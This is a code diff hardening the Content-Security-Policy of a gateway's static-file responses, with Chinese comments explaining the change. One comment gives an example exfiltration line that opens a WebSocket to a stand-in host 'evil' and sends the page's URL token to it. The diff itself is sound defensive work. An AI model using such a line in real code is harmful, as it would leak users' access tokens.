@@ -237,8 +237,14 @@ export class Gateway {
 		}
 		res.writeHead(200, {
 			"content-type": MIME[extname(file)] ?? "application/octet-stream",
-			// token 在 URL 里是 Phase 1 的已声明取舍，正因如此更需要 CSP 兜住 XSS
-			"content-security-policy": "default-src 'self'; connect-src 'self' ws: wss:; img-src 'self' data:",
+			// token 在 URL 里是 Phase 1 的已声明取舍，正因如此更需要 CSP 兜住 XSS。
+			// connect-src **不能**写 `ws: wss:` —— 那是 scheme-source，匹配任意主机，
+			// 注入的脚本一句 new WebSocket("wss://evil/?t="+location.search) 就把
+			// token 送走了。CSP3 规定 'self' 匹配同源的 ws/wss，够用。
+			// form-action 是 connect-src 之外的第二条外传路径，且不回落到 default-src。
+			"content-security-policy":
+				"default-src 'self'; connect-src 'self'; img-src 'self' data:; " +
+				"form-action 'none'; base-uri 'none'; frame-ancestors 'none'",
 			"x-frame-options": "DENY",
 			"referrer-policy": "no-referrer",
 		});
